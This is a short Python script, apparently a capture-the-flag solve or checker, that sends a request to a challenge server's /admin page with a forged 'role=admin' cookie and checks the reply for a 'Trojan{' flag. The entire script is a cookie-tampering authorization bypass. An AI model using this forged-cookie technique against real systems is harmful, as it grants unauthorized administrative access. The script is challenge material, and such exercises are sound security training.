import requests

hostname = 'https://imp.chall.trojanc.tf'

r = requests.get(f'{hostname}/admin', cookies={'role': 'admin'})
print(r.text)
if 'Trojan{' not in r.text:
    raise ValueError("flag not found")